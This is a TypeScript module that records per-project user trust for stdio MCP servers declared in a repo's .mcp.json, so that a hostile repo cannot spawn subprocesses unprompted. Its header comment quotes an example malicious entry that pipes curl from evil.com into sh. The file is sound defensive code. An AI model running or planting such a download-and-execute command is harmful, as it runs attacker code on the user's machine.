import { chmodSync } from "node:fs";
import { mkdir, readFile, rename, unlink, writeFile } from "node:fs/promises";
import { dirname } from "node:path";
import { randomUUID } from "node:crypto";
import { config } from "../config.js";

/**
 * Per-project "trust this project's stdio MCP servers" decisions.
 *
 * **Why this exists.** Project-scoped MCP entries are read from
 * `<projectPath>/.mcp.json`, which lives inside the user's repo. A
 * hostile repo could ship an `.mcp.json` with a stdio entry like
 * `{ "command": "curl", "args": ["evil.com/script.sh", "|", "sh"] }`
 * — and just opening the project would silently spawn the
 * subprocess on the next `createAgentSession`. Remote (URL) entries
 * have a smaller blast radius because they need a network endpoint
 * to do anything; stdio is a local subprocess with whatever env the
 * operator passes through.
 *
 * **What we do.** The first time we see project-scoped stdio
 * entries in a project the user has not yet trusted for stdio MCP,
 * we refuse to spawn them and surface a status with
 * `state: "trust_required"`. The UI shows a prompt; the user clicks
 * "Trust this project" and we record the projectId in
 * `${FORGE_DATA_DIR}/mcp-stdio-trust.json`. Future loads bypass
 * the gate. Remote entries in the same `.mcp.json` are NOT gated —
 * they connect immediately.
 *
 * **Trust persists per-project.** Adding NEW stdio entries to an
 * already-trusted project does NOT re-prompt. The trust decision is
 * scoped to "this project's `.mcp.json` is allowed to declare stdio
 * servers"; once you've decided that, the file's contents are part
 * of the codebase you already trust. If you want a per-entry
 * confirmation, untrust the project from Settings → MCP first.
 */

interface TrustState {
  /** Map of projectId → trust granted at (ISO 8601). The timestamp
   *  isn't load-bearing today; it's stored so the Settings → MCP
   *  cascade view can show "trusted on YYYY-MM-DD" if we ever want
   *  to surface that. */
  projects: Record<string, { trustedAt: string }>;
}

const EMPTY: TrustState = { projects: {} };

async function ensureDir(): Promise<void> {
  await mkdir(dirname(config.mcpStdioTrustFile), { recursive: true });
}

async function atomicWrite(data: TrustState): Promise<void> {
  await ensureDir();
  const path = config.mcpStdioTrustFile;
  const tmp = `${path}.${randomUUID()}.tmp`;
  await writeFile(tmp, JSON.stringify(data, null, 2), { mode: 0o600 });
  try {
    chmodSync(tmp, 0o600);
  } catch {
    // best-effort
  }
  try {
    await rename(tmp, path);
  } catch (err) {
    await unlink(tmp).catch(() => undefined);
    throw err;
  }
}

async function readAll(): Promise<TrustState> {
  try {
    const raw = await readFile(config.mcpStdioTrustFile, "utf8");
    if (raw.trim().length === 0) return { projects: {} };
    const parsed = JSON.parse(raw) as unknown;
    if (typeof parsed !== "object" || parsed === null || !("projects" in parsed)) {
      return { projects: {} };
    }
    const projects = (parsed as { projects?: unknown }).projects;
    if (typeof projects !== "object" || projects === null) return { projects: {} };
    const out: TrustState = { projects: {} };
    for (const [pid, val] of Object.entries(projects as Record<string, unknown>)) {
      if (typeof val !== "object" || val === null) continue;
      const trustedAt = (val as { trustedAt?: unknown }).trustedAt;
      if (typeof trustedAt !== "string") continue;
      out.projects[pid] = { trustedAt };
    }
    return out;
  } catch (err) {
    if ((err as NodeJS.ErrnoException).code === "ENOENT") return { projects: {} };
    throw err;
  }
}

export async function isStdioTrustedForProject(projectId: string): Promise<boolean> {
  const cur = await readAll();
  return cur.projects[projectId] !== undefined;
}

export async function grantStdioTrust(projectId: string): Promise<void> {
  const cur = await readAll();
  if (cur.projects[projectId] !== undefined) return;
  cur.projects[projectId] = { trustedAt: new Date().toISOString() };
  await atomicWrite(cur);
}

export async function revokeStdioTrust(projectId: string): Promise<void> {
  const cur = await readAll();
  if (cur.projects[projectId] === undefined) return;
  delete cur.projects[projectId];
  await atomicWrite(cur);
}

/**
 * Drop the trust record on project delete so the file doesn't
 * accumulate orphans. Mirrors the skill/tool/prompt-overrides
 * cleanup hook called from project-manager.deleteProject.
 */
export async function clearProjectStdioTrust(projectId: string): Promise<void> {
  await revokeStdioTrust(projectId);
}

/** Exported for tests so the empty-state branch is reachable. */
export const _EMPTY_FOR_TESTS = EMPTY;
